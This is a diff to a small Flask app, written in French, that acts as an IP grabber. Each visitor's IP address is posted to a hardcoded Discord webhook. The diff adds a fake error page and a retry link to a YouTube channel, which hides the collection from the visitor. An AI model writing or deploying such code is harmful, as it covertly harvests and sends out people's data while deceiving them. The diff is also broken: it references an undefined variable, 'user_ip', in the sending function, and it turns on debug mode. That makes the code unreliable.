@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, render_template
 import requests
 
 app = Flask(__name__)
@@ -8,13 +8,15 @@ WEBHOOK_URL = 'https://discord.com/api/webhooks/1189581246829957180/aRFpdCSf9Agf
 
 @app.route('/')
 def index():
+    error_message = "Une erreur s'est produite"
+    retry_url = "https://www.youtube.com/@MythicalPlayer_"
     user_ip = request.remote_addr
     send_to_discord_webhook(user_ip)
-    return "Adresse IP envoyée avec succès au webhook Discord"
+    return render_template('index.html', error_message=error_message, retry_url=retry_url)
 
 def send_to_discord_webhook(ip_address):
     payload = {
-        'content': f"Adresse IP de l'utilisateur : {ip_address}"
+        'content': f"Adresse IP de l'utilisateur : {user_ip}"
     }
     try:
         response = requests.post(WEBHOOK_URL, json=payload)
@@ -26,4 +28,4 @@ def send_to_discord_webhook(ip_address):
         print(f"Erreur lors de l'envoi de l'adresse IP au webhook Discord : {str(e)}")
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(debug=True)
